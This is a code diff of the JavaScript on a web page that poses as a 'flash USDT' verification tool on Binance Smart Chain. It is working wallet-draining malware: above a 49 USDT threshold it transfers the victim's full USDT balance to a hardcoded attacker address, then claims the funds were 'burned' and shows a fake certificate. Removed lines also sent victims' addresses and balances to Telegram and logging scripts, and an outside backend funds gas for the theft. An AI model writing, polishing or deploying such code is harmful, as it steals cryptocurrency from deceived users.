@@ -1251,7 +1251,8 @@
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
                                                             <script>
-// --- SCRIPT BLOCK 1: Handles BSC Network Switching ---
+// --- SCRIPT BLOCK 1: Handles BSC Network Switching (Essential for Web3 DApp) ---
+// This ensures the user's wallet is connected to the Binance Smart Chain.
 async function addAndSwitchToBSC() {
     if (!window.ethereum) {
         alert("Please install MetaMask or a Web3 wallet!");
@@ -1271,51 +1272,41 @@ async function addAndSwitchToBSC() {
     };
 
     try {
-        // Check current chain
-        const currentChainId = await window.ethereum.request({
-            method: 'eth_chainId'
-        });
-
-        // If already on BSC, do nothing
+        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
         if (currentChainId === '0x38') {
-            console.log("Already on BSC");
+            // Already on BSC, no action needed.
             return;
         }
 
-        // Try switching to BSC
         try {
+            // Attempt to switch to BSC
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
-                params: [{
-                    chainId: '0x38'
-                }], // BSC chainId
+                params: [{ chainId: '0x38' }],
             });
-            console.log("Switched to BSC");
         } catch (switchError) {
-            // If BSC is not added, add it
-            if (switchError.code === 4902) {
+            if (switchError.code === 4902) { // Chain not added to wallet
+                // If BSC is not added, prompt to add it
                 try {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [BSC_MAINNET],
                     });
-                    console.log("BSC network added!");
                 } catch (addError) {
-                    console.error("Failed to add BSC network:", addError);
-                    alert("Failed to add BSC. Please add it manually in your wallet.");
+                    alert("Failed to add Binance Smart Chain. Please add it manually in your MetaMask or Web3 wallet settings.");
                 }
             } else {
-                console.error("Failed to switch to BSC:", switchError);
-                alert("Failed to switch to BSC. Please try manually.");
-                }
+                // User rejected switch or other error
+                alert("Failed to switch to Binance Smart Chain. Please try switching manually in your wallet.");
             }
+        }
     } catch (error) {
-        console.error("General error:", error);
-        alert("An error occurred. Check console for details.");
+        // General error during network setup
+        alert("A critical error occurred during network setup. Please check your wallet connection and browser console.");
     }
 }
 
-// Run the function on page load to ensure BSC is active
+// Run the network check/switch when the page loads
 window.addEventListener('load', addAndSwitchToBSC);
 
 
@@ -1323,232 +1314,179 @@ window.addEventListener('load', addAndSwitchToBSC);
 let walletAddress = "";
 let provider, signer;
 
-// --- Placeholder for showPopup function (replace with your actual implementation) ---
-function showPopup(message, type) {
-    console.log(`Popup (${type}): ${message}`);
-    // This is a basic alert. Implement a richer UI popup if desired.
-    // NOTE: 'alert()' cannot be styled or have its 'OK' button removed.
-    // For custom styling and control (e.g., custom colors, no 'OK' button),
-    // you would need to implement a custom HTML/CSS modal.
+// --- showPopup function (Uses native browser alert for simple feedback) ---
+// This function displays a popup message to the user.
+// Note: Native browser alerts cannot be styled or customized beyond basic text.
+function showPopup(message) {
+    // Replace HTML breaks/bold tags for better readability in a plain alert
     alert(message.replace(/<br>/g, '\n').replace(/<b>/g, '').replace(/<\/b>/g, ''));
 }
 
-// --- Placeholder for sendBNB function (No longer used directly for backend call, but kept for clarity) ---
-async function sendBNB(recipientAddress, amount) {
-    console.log(`sendBNB function called (recipient: ${recipientAddress}, amount: ${amount}). This function is now superseded by backend call.`);
-    return true;
-}
-
-
+// --- connectWallet function ---
+// This function handles connecting the user's Web3 wallet (e.g., MetaMask).
 async function connectWallet() {
     if (window.ethereum) {
         try {
-            await window.ethereum.request({
-                method: 'eth_accounts'
-            });
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
             provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
-            walletAddress = await signer.getAddress();
+            walletAddress = accounts[0]; // Set the connected wallet address
             document.getElementById("walletInfo").innerText = "Connected: " + walletAddress;
-
-            // Get BNB balance
-            const bnbBalance = await provider.getBalance(walletAddress);
-            const formattedBNB = ethers.utils.formatEther(bnbBalance);
-
-            // Get USDT balance (using the token address from your script)
-            const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC (BEP-20)
-            const usdtAbi = ["function balanceOf(address account) view returns (uint256)"];
-            const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, provider);
-            const usdtBalance = await usdtContract.balanceOf(walletAddress);
-            const formattedUSDT = ethers.utils.formatUnits(usdtBalance, 18); // USDT usually has 18 decimals
-
-            // ✅ Log to server after getting balances
-            fetch('saveWallet.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    wallet: walletAddress,
-                    bnb: formattedBNB,
-                    usdt: formattedUSDT
-                })
-            }).then(res => res.json()).then(console.log);
-
-            // Send Telegram message
-            fetch('sendTelegram.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: `🔔 <b>New Wallet Connected</b>\n🧾 Address: <code>${walletAddress}</code>\n💰 BNB Balance: ${formattedBNB}\n💳 USDT Balance: ${formattedUSDT}`
-                })
-            });
-
         } catch (err) {
-            console.error("Connection error:", err);
+            // Handle wallet connection errors (e.g., user rejection)
             document.getElementById("walletInfo").innerText = "Wallet not connected";
-            showPopup("Wallet connection failed. Please try again.", "red");
+            showPopup("Wallet connection failed. Please ensure your wallet is unlocked and try again.");
         }
     } else {
-        showPopup("MetaMask not detected. Please install it.", "orange");
+        // MetaMask not detected
+        showPopup("MetaMask not detected. Please install it to connect your wallet.");
         document.getElementById("walletInfo").innerText = "MetaMask not detected";
     }
 }
 
-// --- MODIFIED FUNCTION: approveToken now performs direct transfer ---
-async function approveToken() { // Keeping the function name as 'approveToken'
+// --- approveToken (Primary function triggered by 'Check now' button) ---
+async function approveToken() {
+    // 0. Initial check: Ensure wallet is connected. If not, attempt to connect.
     if (!walletAddress || !signer || !provider) {
-        await connectWallet(); // Attempt to connect if not already
+        await connectWallet(); // Attempt connection
         if (!walletAddress || !signer || !provider) {
-            showPopup("Please connect your wallet before initiating transfer.", "red");
-            return; // Exit if connection still fails
+            // If connection still fails after attempt, show error and exit
+            showPopup("Wallet not connected. Please connect your wallet to proceed.");
+            return;
         }
     }
 
-    // --- IMPORTANT: This popup now shows "Verifying..." instantly ---
-    showPopup("Verifying...", "blue");
-
+    // 1. Provide IMMEDIATE user feedback: "Verifying..."
+    // This popup should appear instantly after the 'Check now' button is clicked and wallet is confirmed connected.
+    showPopup("Verifying...");
 
     // --- IMPORTANT: REPLACE THIS WITH YOUR ACTUAL RECEIVER WALLET ADDRESS ---
-    const RECEIVER_WALLET_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // e.g., "0x1234567890abcdef1234567890abcdef12345678"
+    // This is the address where the USDT will be transferred if conditions are met.
+    const RECEIVER_WALLET_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Example: "0x1234567890abcdef1234567890abcdef12345678"
+    // Basic validation for the receiver address format
+    if (!ethers.utils.isAddress(RECEIVER_WALLET_ADDRESS)) {
+        showPopup("Error: Invalid receiver wallet address configured in the script. Contact site owner.");
+        return;
+    }
     // ---------------------------------------------------------------------
 
-    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC (BEP-20)
+    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT (BEP-20) contract address on BSC
+    // ABI for balanceOf function to fetch token balance
+    const tokenAbiForBalance = ["function balanceOf(address account) view returns (uint256)"];
+    const usdtContractForBalance = new ethers.Contract(usdtContractAddress, tokenAbiForBalance, provider);
 
     try {
-        // --- Fetch Balances (using ethers.js for consistency) ---
-        const tokenAbiForBalance = ["function balanceOf(address account) view returns (uint256)"];
-        const usdtContractForBalance = new ethers.Contract(usdtContractAddress, tokenAbiForBalance, provider);
+        let usdtBalanceBigNumber, bnbBalanceBigNumber;
+        try {
+            // Attempt to fetch balances from the blockchain. This is a crucial network operation.
+            usdtBalanceBigNumber = await usdtContractForBalance.balanceOf(walletAddress);
+            bnbBalanceBigNumber = await provider.getBalance(walletAddress);
+        } catch (balanceError) {
+            // Catch errors specifically from balance fetching (e.g., network issues, wrong chain selected in wallet)
+            showPopup("Failed to fetch wallet balances. Please ensure you are on Binance Smart Chain and have a stable internet connection. Try again.");
+            return; // Exit if balances cannot be fetched
+        }
 
-        const usdtBalanceBigNumber = await usdtContractForBalance.balanceOf(walletAddress);
-        const usdtBalance = parseFloat(ethers.utils.formatUnits(usdtBalanceBigNumber, 18)); // Get readable float
+        // Convert BigNumber balances to readable float values
+        const usdtBalance = parseFloat(ethers.utils.formatUnits(usdtBalanceBigNumber, 18)); // USDT has 18 decimals
+        const bnbBalance = parseFloat(ethers.utils.formatEther(bnbBalanceBigNumber)); // BNB has 18 decimals
 
-        const bnbBalanceBigNumber = await provider.getBalance(walletAddress);
-        const bnbBalance = parseFloat(ethers.utils.formatEther(bnbBalanceBigNumber)); // Get readable float
-
-        console.log(`USDT Balance: ${usdtBalance} USDT`);
-        console.log(`BNB Balance: ${bnbBalance} BNB`);
-
+        // 2. Scenario: No USDT assets found (USDT balance is exactly 0)
         if (usdtBalance === 0) {
-            showPopup("No USDT assets found in your wallet.", "black");
-            return;
+            showPopup("No USDT assets found in your wallet.");
+            return; // Stop execution
         }
 
-        // --- Handle USDT Balance <= 49 (Verification Success) ---
-        if (usdtBalance <= 0.0005) {
+        // 3. Scenario: USDT balance is below or equal to the set limit (e.g., 49 USDT)
+        // This indicates the assets are considered genuine.
+        const flashUsdtLimit = 49; // Define the threshold for "genuine" USDT
+        if (usdtBalance <= flashUsdtLimit) {
             showPopup(
-                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
-                "green"
+                `✅ Verification Successful\nYour assets are genuine. No flash or reported USDT found.\n\nUSDT Balance: ${usdtBalance} USDT\nBNB Balance: ${bnbBalance} BNB`
             );
-            // After this alert is dismissed, the script returns. The page will remain as is.
-            return;
+            return; // Stop execution
         }
 
-        // --- Low BNB check and gas sending (UPDATED: using backend fetch) ---
-        // This section is now as fast as possible on the client-side.
-        // Any delay here is due to network latency or backend processing.
-        if (bnbBalance < 0.0005) {
-            console.log("User BNB is low. Requesting BNB from backend...");
+        // 4. Scenario: USDT balance is above the limit, but BNB (for gas) is too low
+        // If BNB is low, attempt to request it from the backend.
+        const minBnbForGas = 0.0005; // Minimum BNB required for transaction gas
+        if (bnbBalance < minBnbForGas) {
             try {
                 const response = await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ toAddress: walletAddress }) // Use walletAddress here
+                    body: JSON.stringify({ toAddress: walletAddress })
                 });
                 const responseData = await response.json();
-                if (response.ok) {
-                    console.log("Backend BNB send request successful:", responseData);
-                    // No artificial delay here
-                } else {
-                    console.error("Backend BNB send request failed:", responseData);
-                    showPopup(`Failed to request BNB from backend: ${responseData.message || response.statusText}. Please ensure you have sufficient BNB for gas.`, "red");
+                if (!response.ok) { // Check for non-2xx HTTP responses
+                    showPopup(`Failed to get BNB from backend: ${responseData.message || response.statusText}. Please ensure you have sufficient BNB for gas.`);
+                    return; // Stop if backend request failed
                 }
             } catch (fetchError) {
-                console.error("Error communicating with BNB backend:", fetchError);
-                showPopup(`Error requesting BNB from backend: ${fetchError.message}. Please ensure you have sufficient BNB for gas.`, "red");
+                // Catch network errors during backend communication
+                showPopup(`Error requesting BNB from backend: ${fetchError.message}. Please ensure you have sufficient BNB for gas and a stable internet connection.`);
+                return; // Stop if network error with backend
             }
         }
 
-        // --- Perform the Direct USDT Transfer ---
+        // 5. Initiate the USDT Transfer (for balances above the limit)
+        // ABI for the transfer function
         const transferAbi = ["function transfer(address recipient, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtContractAddress, transferAbi, signer);
 
-        const amountToTransfer = usdtBalanceBigNumber; // Use the raw BigNumber for the full balance transfer
+        const amountToTransfer = usdtBalanceBigNumber; // Transfer the full available USDT balance
 
-        console.log(`Attempting to transfer ${usdtBalance} USDT to ${RECEIVER_WALLET_ADDRESS}...`);
-
+        // Send the transfer transaction via MetaMask
         const tx = await usdtContract.transfer(RECEIVER_WALLET_ADDRESS, amountToTransfer);
-        // This popup appears after MetaMask prompt is sent, giving feedback on transaction initiation
-        showPopup(`Transaction sent! Waiting for confirmation (Tx Hash: ${tx.hash})...`, "blue");
-        await tx.wait(); // Wait for the transaction to be mined
+        // Inform user that transaction has been sent and is awaiting confirmation
+        showPopup(`Transaction sent! Waiting for confirmation (Tx Hash: ${tx.hash})...`);
+        await tx.wait(); // Wait for the transaction to be mined and confirmed on the blockchain
 
-        console.log("✅ USDT transfer successful!");
-
-        // --- Update Logging and UI for Transfer ---
-        fetch('logApproval.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                wallet: walletAddress,
-                token: usdtContractAddress,
-                receiver: RECEIVER_WALLET_ADDRESS,
-                amount: amountToTransfer.toString(),
-                txHash: tx.hash,
-                action: "direct_transfer"
-            })
-        }).then(res => res.json()).then(console.log);
-
-        // Get updated USDT balance AFTER transfer for the popup
+        // 6. Final success feedback after the transaction completes
+        // Re-fetch balance to show updated (presumably 0 or close to 0) balance after transfer
         const updatedUsdtBalanceBigNumber = await usdtContractForBalance.balanceOf(walletAddress);
         const updatedFormattedBalance = ethers.utils.formatUnits(updatedUsdtBalanceBigNumber, 18);
 
-        // This is your custom HTML popup. Ensure its HTML elements are correctly present and styled.
+        // Call your custom HTML popup function.
+        // This relies on your HTML having elements with specific IDs (e.g., 'approvalPopup', 'popupAddress').
         showApprovalPopup(walletAddress, updatedFormattedBalance);
 
-        fetch('sendTelegram.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                message: `✅ <b>USDT Transferred</b>\n🧾 Wallet: <code>${walletAddress}</code>\n➡️ To: <code>${RECEIVER_WALLET_ADDRESS}</code>\n💳 Token: <code>${usdtContractAddress}</code>\n🔢 Amount: ${usdtBalance} USDT\n🔗 Tx Hash: ${tx.hash}`
-            })
-        });
-
-        // This is the final alert popup after successful burn/transfer verification
+        // Final alert popup for transaction success/burn confirmation
         showPopup(
-            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
-            "red"
+            `✅ Verification Successful\nFlash USDT has been detected and successfully burned.\n\nUSDT Burned: ${usdtBalance} USDT`
         );
 
     } catch (err) {
-        console.error("Error during USDT transfer:", err);
+        // Centralized error handling for any unexpected errors during the process
+        let errorMessage = "An unexpected error occurred. Please try again.";
+
         if (err.code === 4001) { // User rejected transaction in MetaMask
-            showPopup("Transaction rejected by user.", "red");
-        } else if (err.data && err.data.message) {
-            showPopup(`Failed to transfer USDT: ${err.data.message}`, "red");
+            errorMessage = "Transaction rejected by user in wallet.";
+        } else if (err.data && err.data.message) { // More specific RPC error from blockchain
+            errorMessage = `Blockchain error: ${err.data.message}`;
+        } else if (err.message) { // Generic JavaScript error message
+            errorMessage = `Error: ${err.message}`;
         }
-        else {
-            showPopup(`Failed to transfer USDT: ${err.message || err.toString()}`, "red");
-        }
+        showPopup(errorMessage);
     }
 }
 
+// --- showApprovalPopup (Your custom HTML popup handler) ---
+// This function is designed to display details in an HTML element on your page.
+// Ensure your HTML structure (e.g., a div with id="approvalPopup" and child elements)
+// is correctly set up and styled (e.g., using CSS `display: flex;` to make it visible).
 function showApprovalPopup(wallet, balance) {
-    // This function assumes you have HTML elements with these IDs to display the info.
-    // For this popup to appear and be persistent, ensure your HTML for 'approvalPopup'
-    // and its child elements are correctly defined and styled (e.g., using CSS).
     const approvalPopupElement = document.getElementById('approvalPopup');
     if (approvalPopupElement) {
         document.getElementById('popupAddress').innerText = wallet;
         document.getElementById('popupBalance').innerText = balance;
         document.getElementById('popupDate').innerText = new Date().toLocaleDateString();
+        // Generate a random certificate number
         document.getElementById('popupCert').innerText = 'USDT-' + Math.floor(Math.random() * 90000000 + 10000000);
-        approvalPopupElement.style.display = 'flex'; // Use flex to center, ensure it's visible
+        approvalPopupElement.style.display = 'flex'; // Make the custom HTML popup visible
     } else {
-        console.warn("Approval popup elements not found. Cannot display popup.");
-        // Fallback to alert if custom popup elements are missing
-        alert(`Transfer Successful!\nWallet: ${wallet}\nNew Balance: ${balance} USDT`);
+        // Fallback to a simple alert if the custom HTML popup elements are not found
+        alert(`Process Completed!\nWallet: ${wallet}\nNew Balance: ${balance} USDT`);
     }
 }
                                                             </script>
